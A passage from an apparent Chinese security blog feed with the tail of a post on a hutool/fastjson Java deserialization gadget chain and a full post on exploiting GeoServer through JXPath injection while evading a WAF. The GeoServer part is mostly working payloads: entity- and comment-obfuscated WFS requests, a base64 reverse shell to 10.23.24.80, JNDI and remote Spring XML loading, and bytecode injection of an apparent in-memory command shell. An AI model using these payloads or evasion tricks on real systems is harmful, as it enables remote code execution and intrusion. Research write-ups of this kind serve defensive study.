class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDSFactory</span>(setting);<br> DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PooledDSFactory</span>(setting);<br>DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiDSFactory</span>(setting);<br><br><br><span class="hljs-type">JSONArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>array.add(DSFactory);<br><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> utils.maskmapToString(array, array);<br>utils.unserialize(utils.serialize(hashMap));<br></code></pre></td></tr></table></figure><p>JDBC_URL换任意jdbc都行，</p><p><img src="image-20241125180131520.png" alt="image-20241125180131520"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">at cn.hutool.db.DbUtil.getJndiDs(DbUtil.java:<span class="hljs-number">167</span>)<br>at cn.hutool.db.ds.jndi.JndiDSFactory.createDataSource(JndiDSFactory.java:<span class="hljs-number">41</span>)<br>at cn.hutool.db.ds.AbstractDSFactory.createDataSource(AbstractDSFactory.java:<span class="hljs-number">122</span>)<br>at cn.hutool.db.ds.AbstractDSFactory.getDataSource(AbstractDSFactory.java:<span class="hljs-number">82</span>)<br>at cn.hutool.db.ds.DSFactory.getDataSource(DSFactory.java:<span class="hljs-number">62</span>)<br>at com.alibaba.fastjson.serializer.ASMSerializer_1_JndiDSFactory.write(Unknown Source)<br>at com.alibaba.fastjson.serializer.ListSerializer.write(ListSerializer.java:<span class="hljs-number">137</span>)<br>at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:<span class="hljs-number">275</span>)<br>at com.alibaba.fastjson.JSON.toJSONString(JSON.java:<span class="hljs-number">863</span>)<br>at com.alibaba.fastjson.JSON.toString(JSON.java:<span class="hljs-number">857</span>)<br>at javax.swing.UIDefaults$TextAndMnemonicHashMap.get(UIDefaults.java:<span class="hljs-number">1250</span>)<br>at java.util.AbstractMap.equals(AbstractMap.java:<span class="hljs-number">469</span>)<br>at java.util.HashMap.putVal(HashMap.java:<span class="hljs-number">634</span>)<br>at java.util.HashMap.readObject(HashMap.java:<span class="hljs-number">1397</span>)<br></code></pre></td></tr></table></figure><p>最后。下版本加入<a href="https://github.com/Java-Chains/web-chains">web-chains</a></p><h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><p>rome接不了这个gadgegt，rome获取不到DSFactory.class的property描述，也就无法触发getDataSource。</p><p>cb触发不了SimpleDesFactory链，因为cb是指定具体一个的properity，而getDataSource是创建出一个SimpleDataSource对象，创建过程没有触发getConnection,而jacoksn&#x2F;fjson等序列化时，会多次触发properity的getter，setter触发getConnection(但是jackson的随机getter，不稳定)。</p><p><strong>jackson下，SimpleDesFactory链不稳定触发</strong></p><p><img src="image-20241128131320071.png" alt="image-20241128131320071"></p><p><img src="image-20241128131404694.png" alt="image-20241128131404694"></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/">http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://xz.aliyun.com/t/14190">https://xz.aliyun.com/t/14190</a></p><p><a href="https://github.com/Java-Chains/web-chains">https://github.com/Java-Chains/web-chains</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>geoserver绕waf尝试到学习jxpath</title>
    <link href="/2024/11/15/geoserver%E7%BB%95waf%E5%B0%9D%E8%AF%95/"/>
    <url>/2024/11/15/geoserver%E7%BB%95waf%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>​实战遇到waf, 绕过去了，但是不解析，所以本地环境学习一下。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="image-20241115130106300.png" alt="image-20241115130106300"></p><p>Y4 大哥说了  允许调用public构造函数，和public static 的方法。构造函数后可以调用类下的public方法。</p><p><img src="image-20241115173645671.png" alt="image-20241115173645671"></p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p><img src="image-20241115172450291.png" alt="image-20241115172450291"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">wfs:GetPropertyValue</span> <span class="hljs-attr">service</span>=<span class="hljs-string">&#x27;WFS&#x27;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&#x27;2.0.0&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:topp</span>=<span class="hljs-string">&#x27;http://www.openplans.org/topp&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:fes</span>=<span class="hljs-string">&#x27;http://www.opengis.net/fes/2.0&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:wfs</span>=<span class="hljs-string">&#x27;http://www.opengis.net/wfs/2.0&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wfs:Query</span> <span class="hljs-attr">typeNames</span>=<span class="hljs-string">&#x27;sf:archsites&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wfs:valueReference</span>&gt;</span><br>/+<span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#120;</span>[(:suibianxie:)]<span class="hljs-comment">&lt;!----&gt;</span>ec<span class="hljs-symbol">&amp;#010;</span><span class="hljs-symbol">&amp;#032;</span><span class="hljs-symbol">&amp;#009;</span><span class="hljs-symbol">&amp;#010;</span><span class="hljs-symbol">&amp;#032;</span><span class="hljs-symbol">&amp;#009;</span>(<span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#46;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#110;</span><span class="hljs-symbol">&amp;#103;</span><span class="hljs-symbol">&amp;#46;</span><span class="hljs-symbol">&amp;#82;</span><span class="hljs-symbol">&amp;#117;</span><span class="hljs-symbol">&amp;#110;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#46;</span><span class="hljs-symbol">&amp;#103;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#82;</span><span class="hljs-symbol">&amp;#117;</span><span class="hljs-symbol">&amp;#110;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#010;</span><span class="hljs-symbol">&amp;#032;</span><span class="hljs-symbol">&amp;#009;</span>(),&#x27;curl http://10.23.24.80:8089/1&#x27;)<span class="hljs-symbol">&amp;#010;</span><span class="hljs-symbol">&amp;#032;</span><span class="hljs-symbol">&amp;#009;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">wfs:valueReference</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">wfs:GetPropertyValue</span>&gt;</span><br></code></pre></td></tr></table></figure><p>简单来说就是 [] 之间 的东西替换为空，html实体化编码，**<!---->**标签注释符,换行空格绕过</p><p>可惜实战waf绕过去了， [] 没替换掉，实战就是就是。( 表达式里好像只会把一个函数名的[]替换为空，多个函数插只把一个参数的[]替换为空了)</p><p><img src="image-20241115172807952.png" alt="image-20241115172807952"></p><p><img src="image-20241115173210220.png" alt="image-20241115173210220"></p><p>解码这样，说实</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>有时候就检测关键字</p><p>可以换一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">loadLibrary</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot; load(java.lang.Runtime.getRuntime(),&#x27;/Users/snake/Downloads/poc1.dylib&#x27;)&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(&#x27;http://127.0.0.1:8089/1&#x27;)&quot;</span>;<br>String sprl=<span class="hljs-string">&quot;getValue(parseExpression(org.springframework.expression.spel.standard.SpelExpressionParser.new(),&#x27;new java.lang.ProcessBuilder(\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;&#123;echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4yMy4yNC44MC84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;).start()&#x27;))&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">jndi</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.ldap.InitialLdapContext.doLookup(&#x27;ldap://127.0.0.1:80/Object&#x27;)&quot;</span>;<br>String xx=<span class="hljs-string">&quot;getValue(parseExpression(org.springframework.expression.spel.standard.SpelExpressionParser.new(),&#x27;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\&quot;open .\&quot;).getInputStream()).next()&#x27;))&quot;</span>;<br><span class="hljs-type">JXPathContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> JXPathContext.newContext(<span class="hljs-literal">null</span>);<br>context.getValue(xx);<br></code></pre></td></tr></table></figure><p>java.lang.System.load 加载dll， 改属性一样</p><p><img src="image-20241115175128627.png" alt="image-20241115175128627"></p><h4 id="改属性-加载dll，"><a href="#改属性-加载dll，" class="headerlink" title="改属性&#x2F;加载dll，"></a>改属性&#x2F;加载dll，</h4><p>要是jdk8 可以直接jndi得了</p><p>java.lang.System.load 本质调用的是Runtime下的load，所以可换。不要用loadLibrary，loadLibrary会从javalib包下找，传值咬加一堆..&#x2F;..&#x2F;，麻烦死了。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String loadLibrary <span class="hljs-operator">=</span> <span class="hljs-string">&quot; load(java.lang.Runtime.getRuntime(),&#x27;/Users/snake/Downloads/poc1.dylib&#x27;)&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.System</span><span class="hljs-selector-class">.load</span>(<span class="hljs-string">&#x27;/Users/snake/Downloads/poc1.dylib&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="image-20241115175447829.png" alt="image-20241115175447829"></p><h3 id="springxmlbean"><a href="#springxmlbean" class="headerlink" title="springxmlbean"></a>springxmlbean</h3><p><img src="image-20241115184252222.png" alt="image-20241115184252222"></p><p>两个都想，还有几个也可以加载xml，但是参数不是单string, 就用这两个就好了。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.ClassPathXmlApplicationContext</span><span class="hljs-selector-class">.new</span>(<span class="hljs-string">&#x27;http://127.0.0.1:8089/test.xml&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="image-20241115184226732.png" alt="image-20241115184226732"></p><h4 id="ProcessBuilder-exec"><a href="#ProcessBuilder-exec" class="headerlink" title="ProcessBuilder&#x2F;exec"></a>ProcessBuilder&#x2F;exec</h4><p>有些waf就单纯检查exec，换一下ProcessBuilder</p><p><img src="image-20241115180343017.png" alt="image-20241115180343017"></p><p>springxmlbean，也可以加字节码，欢迎在 <a href="https://github.com/Java-Chains/web-chains">https://github.com/Java-Chains/web-chains</a> 中尝试。</p><p>在就事不出网利用</p><h4 id="调用js来加载字节码"><a href="#调用js来加载字节码" class="headerlink" title="调用js来加载字节码"></a>调用js来加载字节码</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">wfs:GetPropertyValue</span> <span class="hljs-attr">service</span>=<span class="hljs-string">&#x27;WFS&#x27;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&#x27;2.0.0&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:topp</span>=<span class="hljs-string">&#x27;http://www.openplans.org/topp&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:fes</span>=<span class="hljs-string">&#x27;http://www.opengis.net/fes/2.0&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:wfs</span>=<span class="hljs-string">&#x27;http://www.opengis.net/wfs/2.0&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wfs:Query</span> <span class="hljs-attr">typeNames</span>=<span class="hljs-string">&#x27;sf:archsites&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wfs:valueReference</span>&gt;</span><br>eval(getEngineByName(javax.script.ScriptEngineManager.new(),&#x27;js&#x27;),&#x27;<br>        var str=&quot;base64code&quot;;<br>        var bt;<br>        try &#123;<br>            bt = org.geotools.util.Base64.decode(str);<br>        &#125; catch (e) &#123;<br>            bt = java.util.Base64.getDecoder().decode(str);<br>        &#125;<br>        var theUnsafe = java.lang.Class.forName(&quot;sun.misc.Unsafe&quot;).getDeclaredField(&quot;theUnsafe&quot;);<br>        theUnsafe.setAccessible(true);<br>        unsafe = theUnsafe.get(null);<br>        unsafe.defineAnonymousClass(java.lang.Class.forName(&quot;java.lang.Class&quot;), bt, null).newInstance();<br>        &#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">wfs:valueReference</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">wfs:GetPropertyValue</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后高版本jdk15+ 没defineAnonymousClass，没js怎么搞了</p><h4 id="jdk17调用spel来加载字节码"><a href="#jdk17调用spel来加载字节码" class="headerlink" title="jdk17调用spel来加载字节码"></a>jdk17调用spel来加载字节码</h4><p>Jdk17 要检测moudule，也没有defineAnonymousClass，直接用spel绕过最简单了，</p><p><img src="image-20241115181000499.png" alt="image-20241115181000499"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">wfs:GetPropertyValue</span> <span class="hljs-attr">service</span>=<span class="hljs-string">&#x27;WFS&#x27;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&#x27;2.0.0&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:topp</span>=<span class="hljs-string">&#x27;http://www.openplans.org/topp&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:fes</span>=<span class="hljs-string">&#x27;http://www.opengis.net/fes/2.0&#x27;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:wfs</span>=<span class="hljs-string">&#x27;http://www.opengis.net/wfs/2.0&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wfs:Query</span> <span class="hljs-attr">typeNames</span>=<span class="hljs-string">&#x27;sf:archsites&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wfs:valueReference</span>&gt;</span>getValue(parseExpression(org.springframework.expression.spel.standard.SpelExpressionParser.new(),&#x27;T(org.springframework.cglib.core.ReflectUtils).defineClass(&quot;org.springframework.expression.Testaac&quot;,T(java.util.Base64).getDecoder().decode(&quot;yv66vgAAADcBAwgAXwoAGQBgCgAvAGEKAC8AYgoAVgBjCABkCgAXAGUIAGYKABcAZwoAVwBoCgBXAGkIAGoIAGsIAGwIAG0KAG4AbwoAbgBwCgAZAHEKABcAcggAcwoAHgB0CAB1BwB2CgAXAHcHAHgKAHkAeggAewgAfAgAfQcAfgoALwB/CACABwCBCgAvAIIKACEAgwoAIQCECgAhAIUHAIYJAIcAiAgAiQoAigCLCgAmAIwIAI0KAIcAjggAjwoAHgCQBwCRCgAXAJIIAJMIAJQIAJUHAJYIAJcKADQAmAoANACZCACaCACbCACcCgAeAJ0IAJ4KAB4AnwgAoAgAoQgAoggAowoApAClCgCkAKYKAKcAqAcAqQoARQCqCACrCgBFAKwIAK0KAEUArgoARQCvEgAAALMKACYAtAEAEGdldFJlcUhlYWRlck5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAY8aW5pdD4BAAMoKVYBAANydW4BAA1TdGFja01hcFRhYmxlBwC1BwC2AQAGYnlwYXNzAQAEZXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7BwC3BwC4AQAKU291cmNlRmlsZQEADFRlc3RhYWMuamF2YQEAA2NtZAwAUgBTDABYAFMMAFQAUwwAuQC6AQAQamF2YS5sYW5nLlRocmVhZAwAuwC8AQAMdGhyZWFkTG9jYWxzDAC9AL4MAL8AwAwAwQDCAQAkamF2YS5sYW5nLlRocmVhZExvY2FsJFRocmVhZExvY2FsTWFwAQAFdGFibGUBACpqYXZhLmxhbmcuVGhyZWFkTG9jYWwkVGhyZWFkTG9jYWxNYXAkRW50cnkBAAV2YWx1ZQcAwwwAxADFDADBAMYMAMcAyAwAyQBPAQAnb3JnLmVjbGlwc2UuamV0dHkuc2VydmVyLkh0dHBDb25uZWN0aW9uDADKAMsBAA5nZXRIdHRwQ2hhbm5lbAEAD2phdmEvbGFuZy9DbGFzcwwAzADNAQAQamF2YS9sYW5nL09iamVjdAcAzgwAzwDQAQALZ2V0UmVzcG9uc2UBAApnZXRSZXF1ZXN0AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwwATgBPAQAJZ2V0V3JpdGVyAQATamF2YS9pby9QcmludFdyaXRlcgwAWQBaDADRANIMANMAUwwA1ABTAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcA1QwA1gDXAQARVGVzdGFhYyBleGNlcHRpb24HANgMANkA0gwA2gBTAQAMamF2YS52ZXJzaW9uDADbAFoBAAIxNwwA3ADdAQAmb3JnL3NwcmluZ2ZyYW1ld29yay9leHByZXNzaW9uL1Rlc3RhYWMMAN4A3wEADGJ5cGFzcyBzdGFydAEAD3N1bi5taXNjLlVuc2FmZQEACXRoZVVuc2FmZQEAD3N1bi9taXNjL1Vuc2FmZQEABm1vZHVsZQwA4ADhDADiAOMBAApieXBhc3MgZW5kAQAOYWxyZWFkeSBieXBhc3MBAAdvcy5uYW1lDADkAE8BAAN3aW4MAOUA5gEABy9iaW4vc2gBAAItYwEAB2NtZC5leGUBAAIvYwcA5wwA6ADpDABZAOoHAOsMAOwA7QEAEWphdmEvdXRpbC9TY2FubmVyDABSAO4BAAJcYQwA7wDwAQAADADxAPIMAPMATwEAEEJvb3RzdHJhcE1ldGhvZHMPBgD0CAD1DAD2APcMAPgATwEAEGphdmEvbGFuZy9UaHJlYWQBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAF2phdmEvbGFuZy9yZWZsZWN0L0FycmF5AQAJZ2V0TGVuZ3RoAQAVKExqYXZhL2xhbmcvT2JqZWN0OylJAQAnKExqYXZhL2xhbmcvT2JqZWN0O0kpTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAHZ2V0TmFtZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAA9wcmludFN0YWNrVHJhY2UBAAtnZXRQcm9wZXJ0eQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAlnZXRNb2R1bGUBABQoKUxqYXZhL2xhbmcvTW9kdWxlOwEAEW9iamVjdEZpZWxkT2Zmc2V0AQAcKExqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDspSgEAD2dldEFuZFNldE9iamVjdAEAOShMamF2YS9sYW5nL09iamVjdDtKTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQKAPkA+gEAAgEBAQAXbWFrZUNvbmNhdFdpdGhDb25zdGFudHMBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACmdldE1lc3NhZ2UHAPsMAPYA/wEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQcBAQEABkxvb2t1cAEADElubmVyQ2xhc3NlcwEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwECAQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhAC8AGQAAAAAABQACAE4ATwABAFAAAAAbAAEAAQAAAAMSAbAAAAABAFEAAAAGAAEAAAAKAAEAUgBTAAEAUAAAADAAAQABAAAADCq3AAK4AAMqtgAEsQAAAAEAUQAAABIABAAAAA0ABAAOAAcADwALABAAAgBUAFMAAQBQAAACLgAGAA8AAAFNuAAFTBIGuAAHEgi2AAlNLAS2AAosK7YAC04SDLgABzoEGQQSDbYACToFGQUEtgAKGQUttgALOgYSDrgABzoHGQcSD7YACToIGQgEtgAKAToJAzYKFQoZBrgAEKIAOBkGFQq4ABE6CxkLxgAkGQgZC7YACzoJGQnGABYZCbYAErYAExIUtgAVmQAGpwAJhAoBp//EGQm2ABISFgO9ABe2ABgZCQO9ABm2ABo6ChkKtgASEhsDvQAXtgAYGQoDvQAZtgAaOgsZCrYAEhIcA70AF7YAGBkKA70AGbYAGjoMGQy2ABISHQS9ABdZAxIeU7YAGBkMBL0AGVkDKrYAH1O2ABrAAB46DRkNxgA0GQu2ABISIAO9ABe2ABgZCwO9ABm2ABrAACE6DhkOKhkNtgAitgAjGQ62ACQZDrYAJacAEEyyACcSKLYAKSu2ACqxAAEAAAE8AT8AJgACAFEAAACGACEAAAAUAAQAFQAPABYAFAAXABoAGAAhABkAKgAaADAAGwA4ABwAPwAdAEgAHgBOAB8AUQAgAF4AIQBnACIAbAAjAHUAJACKACUAjQAgAJMAKACsACkAxQAqAN4AKwEGACwBCwAtAScALgEyAC8BNwAwATwANQE/ADIBQAAzAUgANAFMADYAVQAAADsABv8AVAALBwAvBwBWBwBXBwAZBwAXBwBXBwAZBwAXBwBXBwAZAQAAOPoABf8AqAABBwAvAABCBwAmDAAJAFgAUwABAFAAAADrAAUABwAAAHoSK7gALBIttgAumQBfEi+2ADASGbYAMKUAUrIAJxIxtgApEjK4AAdLKhIztgAJTCsEtgAKKwG2AAvAADRNEhm2ADBOEi86BCwSFxI1tgAJtgA2NwUsGQQWBS22ADdXsgAnEji2ACmnAAuyACcSObYAKacACEsqtgAqsQABAAAAcQB0ACYAAgBRAAAARgARAAAAOQAaADoAIgA7ACgAPAAvAD0ANAA+AD0APwBDAEAARwBBAFQAQgBeAEMAZgBEAGkARQBxAEoAdABIAHUASQB5AEsAVQAAAAsABPsAaQdCBwAmBAACAFkAWgABAFAAAAEcAAQACAAAAIoEPRI6uAAsTi3GABEttgA7Ejy2AD2ZAAUDPRyZABgGvQAeWQMSPlNZBBI/U1kFK1OnABUGvQAeWQMSQFNZBBJBU1kFK1M6BLgAQhkEtgBDtgBEOgW7AEVZGQW3AEYSR7YASDoGEkk6BxkGtgBKmQAUGQcZBrYAS7oATAAAOgen/+oZB7BNLLYATbAAAQAAAIMAhAAmAAIAUQAAADYADQAAAE4AAgBPAAgAUAAYAFEAGgBSAEcAUwBUAFQAZABVAGgAVgBwAFcAgQBYAIQAWQCFAFoAVQAAADwABv0AGgEHAB4YUQcAW/8AIgAIBwAvBwAeAQcAHgcAWwcAXAcARQcAHgAAGP8AAgACBwAvBwAeAAEHACYAAwBdAAAAAgBeAP4AAAAKAAEA/AEAAP0AGQCwAAAACAABALEAAQCy&quot;),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(&quot;org.springframework.expression.ExpressionParser&quot;)).newInstance()&#x27;))<span class="hljs-tag">&lt;/<span class="hljs-name">wfs:valueReference</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">wfs:GetPropertyValue</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>需要注意，jdk17会检查moudle。在使用spel加载字节码的时候，它会检查类的名字，要是在一个包下，就可以完成绕过，所以在defineClass的时候，类名要在org.springframework.expression包下，生成的时候注意</strong>。用spring自带的ReflectUtils的defineClass进行类加载。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>低版本jdk，直接exec&#x2F;ProcessBuilder, 或者jndi加载类，不行就先改系统属性在jndi。不出网就调用js使用unsafe.defineAnonymousClass打加载字节码(jdk15一下) ，jdk17以上使用spel表达式进行加载字节码。</p><p>绕过就是在每两个字符直接插<!----> 或者插入[anystr]符号，或者直接全部html编码,在函数()直接疯狂空格换行，</p><p><img src="image-20241115190319629.png" alt="image-20241115190319629"></p><p>可以看到完全没毛病，最后插入**[anyString]** 